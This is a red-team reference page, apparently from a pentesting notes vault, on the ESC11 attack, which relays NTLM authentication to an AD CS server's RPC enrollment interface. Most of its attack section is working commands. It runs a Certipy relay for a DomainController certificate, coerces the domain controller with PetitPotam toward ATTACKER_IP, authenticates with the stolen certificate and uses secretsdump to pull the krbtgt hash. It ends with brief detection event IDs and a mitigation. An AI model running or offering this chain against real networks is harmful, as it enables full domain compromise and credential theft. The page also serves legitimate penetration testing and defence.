---
title: "Attack #34 — ESC11 NTLM Relay to ADCS RPC"
description: "ESC11 is similar to ESC8 but targets the CA's RPC enrollment interface (MS-ICPR) instead of the HTTP web enrollment. If the CA does not enforce packet…"
category: active-directory
subcategory: "ADCS & Certificates"
tags: ["active-directory", "adcs", "credential-access", "ntlm", "relay"]
tools: ["Impacket", "Certipy"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Four/🟢 Attack #34 — ESC11 NTLM Relay to ADCS RPC.md"
---
# 🟢 Attack #34 — ESC11: NTLM Relay to ADCS RPC

***

## 📖 How It Works

ESC11 is similar to ESC8 but targets the CA's **RPC enrollment interface (MS-ICPR)** instead of the HTTP web enrollment. If the CA does not enforce packet privacy (the `IF_ENFORCEENCRYPTICERTREQUEST` flag is disabled), an attacker can relay NTLM authentication to the RPC interface to request certificates — even when HTTP web enrollment is disabled or protected by EPA.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **IF_ENFORCEENCRYPTICERTREQUEST disabled** | CA RPC interface doesn't require signing/encryption |
| **Coercion capability** | PetitPotam, PrinterBug, etc. |
| **Network access to CA RPC** | TCP 135 + dynamic RPC ports |

***

## 💻 Full Commands

### 🔵 Check If Vulnerable

```bash
# ── Certipy ───────────────────────────────────────────────────────────────────
certipy find -u low_user@corp.local -p 'Password1' -dc-ip 10.10.10.10 -vulnerable -stdout
# Look for: ESC11 — IF_ENFORCEENCRYPTICERTREQUEST is disabled
```

### 🔴 Exploit ESC11

```bash
# ── Step 1: Start Certipy relay targeting RPC ─────────────────────────────────
certipy relay -ca CA01.corp.local -template DomainController

# ── Step 2: Coerce DC ─────────────────────────────────────────────────────────
python3 PetitPotam.py ATTACKER_IP DC01.corp.local

# ── Step 3: Authenticate with resulting certificate ──────────────────────────
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10

# ── Step 4: DCSync ────────────────────────────────────────────────────────────
secretsdump.py corp.local/'DC01$'@DC01.corp.local -hashes :<HASH> -just-dc-user krbtgt
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4886** | Security Log (CA) | Certificate enrollment via RPC from unexpected source |
| **4768** | Security Log (DC) | PKINIT TGT using DC certificate |

***

## 🔗 Attack Chain Context

```
[ESC11] ──→ NTLM Relay to CA RPC → same result as ESC8
         │
         ├──→ 🔗 Alternative to ESC8 when HTTP enrollment is disabled/protected
         ├──→ 💥 Same outcome: DC cert → DCSync → domain compromise
         └──→ 💀 Defeated by: enable IF_ENFORCEENCRYPTICERTREQUEST, disable NTLM
```

***

> ✅ **Attack #34 — ESC11 complete.**
